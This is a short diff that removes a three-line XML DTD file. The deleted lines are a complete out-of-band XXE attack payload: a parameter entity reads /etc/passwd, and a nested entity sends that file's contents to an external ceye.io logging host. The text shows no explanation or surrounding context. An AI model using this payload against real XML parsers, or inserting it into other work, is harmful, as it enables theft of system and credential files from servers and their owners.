@@ -1,3 +1,0 @@
-<!ENTITY % payload SYSTEM "file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY % send SYSTEM 'http://xxe.dvjfeh.ceye.io/%payload;'>">
-%param1;
